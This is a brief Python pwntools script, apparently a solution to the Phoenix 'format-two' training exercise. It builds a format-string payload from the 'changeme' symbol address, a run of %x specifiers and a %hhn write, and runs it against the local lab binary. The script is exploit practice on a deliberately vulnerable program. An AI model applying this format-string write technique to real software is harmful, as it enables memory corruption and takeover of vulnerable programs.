#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/i486/format-two"
context.binary = path
payload = (
    pack(context.binary.symbols["changeme"]) + b".%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%hhn"
)

io = process([path, payload])
print(io.recvline())
print(io.recvline())
